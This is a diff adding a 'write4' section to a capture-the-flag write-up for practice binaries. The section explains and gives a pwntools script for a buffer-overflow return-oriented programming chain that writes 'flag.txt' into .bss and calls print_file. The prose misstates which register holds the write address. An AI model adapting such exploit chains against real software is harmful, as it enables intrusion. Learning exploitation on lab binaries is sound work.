@@ -103,7 +103,7 @@ this challenge tasks us with calling 3 different plt function entries with 3 arg
 
 we are asked to call `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
 
-since we don't know the actuall addresses of these functions in the external library we leverage the plt which uses fixed addresses (no PIE), we also apply the same concept from the previous challenge except we have to
+since we don't know the actual addresses of these functions in the external library we leverage the plt which uses fixed addresses (no PIE), we also apply the same concept from the previous challenge except we have to
 use three arguments, in the x86_64 calling convention the first 3 arguments of a function are in this order rdi, rsi, rdx, with rdi being the first argument and rdx being the 3rd, we construct the final solve script based
 on these principles:
 
@@ -146,5 +146,48 @@ io.sendlineafter(b'> ', payload)
 io.interactive()
 ```
 
+## write4
+
+in this challenge there is no free `'/bin/cat flag.txt'` nor free `system()` call or `win()` function
+however there is a plt entry of a `print_file()` function which just opens the file of our choice, but
+how do we open flag.txt???
+
+using a `mov [reg1], reg2` gadget from the binary which takes the contents of reg2 and moves it into what is in the memory address of reg2,
+we use this gadget to write the flag.txt file name into the .bss section of the binary (uninitialized data) and then use the traditional pop rdi
+gadget to do `print_file("flag.txt")` (we point the rdi register to the .bss section where we wrote 'flag.txt'):
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+elf = ELF('./write4')
+rop = ROP(elf)
+io = process(elf.path)
+
+offset = 40
+print_file = elf.plt['print_file']
+
+mov_r14_r15 = 0x400628
+pop_r14_r15 = rop.find_gadget(['pop r14','pop r15','ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
+
+payload = b'A' * offset
+
+payload += p64(pop_r14_r15)
+payload += p64(elf.bss() + 0x200)      
+payload += b"flag.txt"             
+payload += p64(mov_r14_r15)      
+
+payload += p64(pop_rdi)
+payload += p64(elf.bss() + 0x200)       
+payload += p64(print_file)     
+
+io.sendlineafter(b'> ', payload)
+io.interactive()
+```
+
+## badchars
 
 
